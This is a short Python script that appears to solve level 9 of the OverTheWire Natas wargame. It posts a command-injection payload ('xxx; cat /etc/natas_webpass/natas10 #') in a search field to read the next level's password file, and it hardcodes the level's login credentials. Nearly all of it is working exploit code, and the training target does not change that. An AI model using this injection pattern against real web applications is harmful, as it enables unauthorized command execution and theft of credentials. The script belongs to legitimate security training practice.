#!/usr/bin/env python3

import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org' % username

# response = requests.get(url, auth=(username, password))
# content = response.text

search = 'xxx; cat /etc/natas_webpass/natas10 #'
data = {
    'needle': search,
    'submit': 'submit'
}
response = requests.post(url, auth=(username, password), data=data)
content = response.text

flag = re.findall('<pre>\n(.*)\n</pre>', content)[0]

print(flag)